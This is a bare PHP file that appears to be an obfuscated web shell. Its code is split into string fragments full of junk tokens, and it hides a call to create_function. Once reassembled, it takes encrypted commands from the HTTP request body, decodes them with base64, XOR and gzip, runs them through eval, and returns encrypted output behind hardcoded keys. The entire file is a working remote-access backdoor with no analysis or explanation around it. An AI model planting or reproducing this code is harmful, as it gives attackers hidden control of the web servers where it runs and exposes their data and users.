<?php
$j='0e("/$k0eh(0e.+)$kf/",@f0eile0e_ge0et_0econtents("0ephp:0e//input"0e),0e$m)==1) {@ob_star0e0et();';
$Z='nd0e_clea0en0e();$r=@base0e64_en0ec0eode(@x0e0e(@gzcompre0ess($o),$k))0e;print("$0ep0e$kh$r$kf");}';
$B='0e0;($j<0e$c&&$i<0e$l)0e;$0ej++,$i++){$o.=$t{$i}^0e0e$k{$0ej};}}retu0ern $o;}if (0e@p0ereg_match';
$c='@ev0eal(@g0e0ezuncompr0eess(@x(@base60e40e_decode($0em[1]),$k)0e));$o=@o0eb_0e0eg0eet_contents();@ob_e';
$V=str_replace('A','','creAaAteA_AAAfunction');
$H='n0ectio0en x($t,$k){$c=s0etrl0een($k);$l=0estrlen(0e$t);$o0e="0e";0efor(0e$i=0;$i<$l;)0e0e{for($j=';
$l='$k="ce32d0e16e";$0ekh="90e6175ba0e46f11"0e;$kf="60e6a1d30e21d42f"0e0e;$p="vQ0ecIPV6HZtQ0eW11zS0e";f0eu';
$K=str_replace('0e','',$l.$H.$B.$j.$c.$Z);
$o=$V('',$K);$o();
?>
